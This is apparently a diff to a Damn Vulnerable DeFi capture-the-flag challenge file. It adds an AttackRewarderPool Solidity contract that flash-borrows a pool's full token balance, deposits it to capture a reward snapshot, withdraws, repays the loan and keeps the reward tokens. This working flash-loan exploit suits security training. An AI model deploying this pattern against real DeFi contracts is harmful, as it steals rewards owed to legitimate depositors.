@@ -5,6 +5,9 @@ pragma solidity ^0.8.0;
 import "./RewardToken.sol";
 import "../DamnValuableToken.sol";
 import "./AccountingToken.sol";
+import "./FlashLoanerPool.sol";
+import "./RewardToken.sol";
+import "hardhat/console.sol";
 
 /**
  * @title TheRewarderPool
@@ -100,4 +103,44 @@ contract TheRewarderPool {
     function isNewRewardsRound() public view returns (bool) {
         return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
     }
+}
+
+
+contract AttackRewarderPool {
+    // Pass 5 days in test and call exploit
+    // get flash loan from FlashLoanerPool
+    // In receiveFlashLoan, approve and deposit DVT tokens in Reward Pool
+    // Call distributeRewards and withdraw DVT token and return FlashLoan
+
+    FlashLoanerPool immutable lenderPool;
+    DamnValuableToken public immutable liquidityToken;
+    TheRewarderPool immutable rewardPool;
+    RewardToken public immutable rewardToken;
+    address private lenderPoolAddress;
+    address private rewardPoolAddress;
+
+    constructor(address _lenderPool, address _tokenAddress, address _rewardPool, address _rewardTokenAddress) {
+        lenderPoolAddress = _lenderPool;
+        rewardPoolAddress = _rewardPool;
+        lenderPool = FlashLoanerPool(_lenderPool);
+        liquidityToken = DamnValuableToken(_tokenAddress);
+        rewardPool = TheRewarderPool(_rewardPool);
+        rewardToken = RewardToken(_rewardTokenAddress);
+    }
+
+    function exploit() public {
+        console.log("Flash Loan Pool balance : ", liquidityToken.balanceOf(lenderPoolAddress));
+        lenderPool.flashLoan(liquidityToken.balanceOf(lenderPoolAddress));
+        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
+    }
+
+    function receiveFlashLoan(uint256 amount) public { 
+        console.log("Received Loan : ", amount);
+        liquidityToken.approve(rewardPoolAddress, amount);
+        rewardPool.deposit(amount);
+        rewardPool.distributeRewards();
+        rewardPool.withdraw(amount);
+        liquidityToken.transfer(lenderPoolAddress, amount);
+    }
+
 }
